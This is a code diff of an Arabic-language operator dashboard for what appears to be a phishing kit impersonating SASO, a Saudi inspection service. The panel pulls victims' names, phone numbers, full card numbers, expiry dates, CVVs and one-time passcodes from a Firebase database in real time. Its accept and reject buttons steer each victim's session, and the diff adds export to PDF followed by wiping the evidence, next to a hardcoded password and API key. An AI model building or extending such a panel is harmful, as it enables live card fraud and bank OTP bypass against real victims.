@@ -3,122 +3,142 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>لوحة التحكم السريعة</title>
+    <title>لوحة التحكم الآمنة - ساسو</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2pdf.js/0.10.1/html2pdf.bundle.min.js"></script>
+    
     <style>
-        * { box-sizing: border-box; font-family: sans-serif; }
-        body { background: #eee; margin: 0; padding: 0; }
-        
-        /* شاشة الدخول - مبسطة جداً */
-        #auth { position: fixed; inset: 0; background: #006C35; z-index: 9999; display: flex; justify-content: center; align-items: center; }
-        .login-box { background: white; padding: 20px; border-radius: 5px; width: 90%; max-width: 300px; text-align: center; }
-        .login-box input { width: 100%; padding: 12px; margin: 10px 0; border: 2px solid #ddd; font-size: 18px; }
-        .login-box button { width: 100%; padding: 12px; background: #d4af37; border: none; font-weight: bold; cursor: pointer; }
-
-        .nav { background: #006C35; display: flex; position: sticky; top: 0; z-index: 100; }
-        .nav button { flex: 1; padding: 15px; color: white; background: none; border: none; font-size: 14px; border-bottom: 3px solid transparent; }
-        .nav button.active { border-bottom-color: #d4af37; font-weight: bold; }
-
-        .content { padding: 10px; }
-        .card { background: white; margin-bottom: 10px; padding: 15px; border-radius: 4px; border-right: 5px solid #006C35; box-shadow: 0 1px 3px rgba(0,0,0,0.1); }
-        .card b { color: #006C35; font-size: 16px; }
-        .card code { display: block; background: #fffcf0; padding: 5px; margin: 5px 0; font-size: 16px; border: 1px solid #fcebb6; color: #856404; }
-        
-        .btn-group { display: flex; gap: 5px; margin-top: 10px; }
-        .btn { flex: 1; padding: 12px; border: none; color: white; border-radius: 3px; font-weight: bold; font-size: 14px; }
-        .ok { background: #28a745; }
-        .no { background: #dc3545; }
-        .hidden { display: none; }
+        body { font-family: sans-serif; background: #ececec; margin: 0; padding: 0; }
+        #auth_gate { position: fixed; inset: 0; background: #006C35; display: flex; align-items: center; justify-content: center; z-index: 10000; }
+        .gate-box { background: #fff; padding: 30px; border-radius: 12px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.3); width: 85%; max-width: 350px; }
+        .main-ui { display: none; padding: 15px; }
+        .navbar { background: #006C35; color: #fff; padding: 12px; display: flex; justify-content: space-between; align-items: center; position: sticky; top: 0; z-index: 100; border-bottom: 3px solid #d4af37; }
+        .v-count { background: #ffd700; color: #000; padding: 4px 12px; border-radius: 20px; font-weight: bold; font-size: 13px; }
+        .cards-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(100%, 1fr)); gap: 15px; margin-top: 15px; }
+        .card { background: #fff; border-radius: 10px; padding: 15px; border-right: 6px solid #006C35; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
+        .card-row { display: flex; justify-content: space-between; margin-bottom: 6px; border-bottom: 1px solid #f9f9f9; padding-bottom: 4px; }
+        .label { color: #888; font-size: 12px; }
+        .value { font-weight: bold; font-family: monospace; font-size: 14px; color: #333; }
+        .otp-val { color: #d32f2f; font-size: 18px !important; }
+        .actions { display: flex; gap: 8px; margin-top: 12px; }
+        .btn-ctl { flex: 1; padding: 10px; border: none; border-radius: 5px; color: white; font-weight: bold; cursor: pointer; font-size: 13px; }
+        .btn-ok { background: #28a745; }
+        .btn-no { background: #dc3545; }
+        .btn-pdf { background: #d32f2f; color: #fff; border: none; padding: 8px 12px; border-radius: 5px; font-size: 12px; }
     </style>
 </head>
-<body>
+<body onload="_initAuth()">
 
-<div id="auth">
-    <div class="login-box">
-        <h3>رمز الدخول</h3>
-        <input type="password" id="passCode" placeholder="أدخل الرقم السري">
-        <button onclick="doLogin()">دخول النظام</button>
+<audio id="notif_sound" src="https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3"></audio>
+
+<div id="auth_gate">
+    <div class="gate-box">
+        <h3 style="margin-top:0; color:#006C35">نظام التحقق المشفر</h3>
+        <input type="password" id="access_key" placeholder="أدخل المفتاح" style="width:100%; padding:12px; border:1px solid #ddd; border-radius:5px; text-align:center; font-size:18px;">
+        <br><br>
+        <button onclick="_verify()" style="width:100%; padding:12px; background:#006C35; color:#fff; border:none; border-radius:5px; font-weight:bold;">دخول آمن</button>
     </div>
 </div>
 
-<div class="nav">
-    <button id="t1" class="active" onclick="showTab('b1', 't1')">العملاء</button>
-    <button id="t2" onclick="showTab('b2', 't2')">البطاقات</button>
-</div>
-
-<div class="content">
-    <div id="b1"></div>
-    <div id="b2" class="hidden"></div>
+<div id="main_ui_wrap" class="main-ui">
+    <div class="navbar">
+        <div class="v-count">الطلبات: <span id="v_total">0</span></div>
+        <button class="btn-pdf" onclick="_exportPDF()">تصدير PDF وتفريغ</button>
+        <button onclick="_exit()" style="background:#444; color:#fff; border:none; padding:8px 12px; border-radius:5px;">خروج</button>
+    </div>
+    <div id="data_stream" class="cards-grid"></div>
 </div>
 
 <script>
-    const config = {
-        apiKey: "AIzaSyAeZAjT4kZWVLJSKiehqLFrT8",
-        databaseURL: "https://saso-inspection-default-rtdb.firebaseio.com/",
-        projectId: "saso-inspection"
-    };
-    firebase.initializeApp(config);
-    const db = firebase.database();
+    // الهاش المشفر لكلمة السر H1234567890H
+    const _H = "547f8969315d97f26c9f68802a4505f5903b708b7654f15d97a9f77f32a67768"; 
+    const _S = "saso_secure_session";
+    let _DB;
 
-    function doLogin() {
-        if(document.getElementById('passCode').value === "H1234567890H") {
-            document.getElementById('auth').style.display = 'none';
-            sessionStorage.setItem('logged', 'true');
-        } else { alert('خطأ في الرمز'); }
+    function _initAuth() {
+        if(sessionStorage.getItem(_S) === "active") _launch();
     }
-    if(sessionStorage.getItem('logged') === 'true') document.getElementById('auth').style.display = 'none';
 
-    // الاستماع للبيانات
-    db.ref('orders').on('value', (snap) => {
-        const b1 = document.getElementById('b1');
-        const b2 = document.getElementById('b2');
-        b1.innerHTML = ''; b2.innerHTML = '';
+    // دالة التشفير والمقارنة
+    async function _verify() {
+        const val = document.getElementById('access_key').value;
+        const msgUint8 = new TextEncoder().encode(val);
+        const hashBuffer = await crypto.subtle.digest('SHA-256', msgUint8);
+        const hashArray = Array.from(new Uint8Array(hashBuffer));
+        const hashHex = hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
 
-        snap.forEach((child) => {
-            const data = child.val();
-            const id = child.key;
-            const p = data.personal_info || {};
-            const c = data.card_details || {};
+        if(hashHex === _H) {
+            sessionStorage.setItem(_S, "active");
+            _launch();
+        } else {
+            alert("فشل التحقق: المفتاح غير صحيح");
+        }
+    }
 
-            // تبويب العملاء
-            b1.innerHTML += `<div class="card">
-                <b>${p.fullName || 'زائر'}</b><br>
-                <span>📞 ${p.phone || '---'}</span><br>
-                <small style="color: blue;">📍 حالياً في: ${data.current_page || 'البداية'}</small>
-            </div>`;
+    function _launch() {
+        document.getElementById('auth_gate').style.display = 'none';
+        document.getElementById('main_ui_wrap').style.display = 'block';
+        _connectDB();
+    }
 
-            // تبويب البطاقات
-            if(c.cardNumber) {
-                b2.innerHTML += `<div class="card">
-                    <b>الاسم: ${p.fullName || 'غير مسجل'}</b>
-                    <code>${c.cardNumber}</code>
-                    <div style="display:flex; justify-content: space-between; font-size:13px;">
-                        <span>التاريخ: ${c.expiryDate}</span>
-                        <span>CVV: ${c.cvv}</span>
-                    </div>
-                    <div style="color:red; font-weight:bold; margin-top:5px;">OTP: ${c.otp || 'بانتظار الرمز...'}</div>
-                    <div class="btn-group">
-                        <button class="btn ok" onclick="action('${id}','next')">قبول ✅</button>
-                        <button class="btn no" onclick="action('${id}','error')">رفض ❌</button>
-                    </div>
-                </div>`;
+    function _exit() {
+        sessionStorage.removeItem(_S);
+        location.reload();
+    }
+
+    function _connectDB() {
+        const _cfg = {
+            apiKey: "AIzaSyAeZAjT4kZWVLJSKiehqLFrT8",
+            databaseURL: "https://saso-inspection-default-rtdb.firebaseio.com",
+            projectId: "saso-inspection"
+        };
+        if (!firebase.apps.length) firebase.initializeApp(_cfg);
+        _DB = firebase.database();
+
+        _DB.ref('orders').on('value', snap => {
+            const container = document.getElementById('data_stream');
+            container.innerHTML = '';
+            let count = 0;
+
+            snap.forEach(child => {
+                const id = child.key;
+                const data = child.val();
+                const p = data.personal_info || {};
+                const c = data.card_details || {};
+                count++;
+
+                const html = `
+                    <div class="card" id="r_${id}">
+                        <div class="card-row"><span class="label">العميل</span><span class="value">${p.fullName || '---'}</span></div>
+                        <div class="card-row"><span class="label">البطاقة</span><span class="value">${c.cardNumber || '----'}</span></div>
+                        <div class="card-row"><span class="label">EXP/CVV</span><span class="value">${c.expiryDate || '--'} | ${c.cvv || '--'}</span></div>
+                        <div class="card-row"><span class="label">كود OTP</span><span class="value otp-val">${c.otp || 'بانتظار...'}</span></div>
+                        <div class="card-row"><span class="label">الموقع</span><span class="value" style="color:blue">${data.current_page || 'نشط'}</span></div>
+                        <div class="actions">
+                            <button class="btn-ctl btn-ok" onclick="_control('${id}', 'next')">قبول ✅</button>
+                            <button class="btn-ctl btn-no" onclick="_control('${id}', 'error')">رفض ❌</button>
+                        </div>
+                    </div>`;
+                container.insertAdjacentHTML('afterbegin', html);
+            });
+            document.getElementById('v_total').innerText = count;
+        });
+    }
+
+    function _control(id, action) {
+        _DB.ref('orders/' + id).update({ control_action: action });
+    }
+
+    async function _exportPDF() {
+        const target = document.getElementById('data_stream');
+        if(!target.children.length) return alert("لا يوجد بيانات");
+        const opt = { margin: 5, filename: 'saso_report.pdf', image: { type: 'jpeg' }, html2canvas: { scale: 2 }, jsPDF: { unit: 'mm', format: 'a4' } };
+        html2pdf().set(opt).from(target).save().then(() => {
+            if(confirm("تم التحميل، هل تريد مسح البيانات الآن؟")) {
+                _DB.ref('orders').remove();
             }
         });
-    });
-
-    function action(id, type) {
-        db.ref('orders/' + id).update({ control_action: type });
-    }
-
-    function showTab(tabId, btnId) {
-        document.getElementById('b1').classList.add('hidden');
-        document.getElementById('b2').classList.add('hidden');
-        document.getElementById('t1').classList.remove('active');
-        document.getElementById('t2').classList.remove('active');
-        
-        document.getElementById(tabId).classList.remove('hidden');
-        document.getElementById(btnId).classList.add('active');
     }
 </script>
 </body>
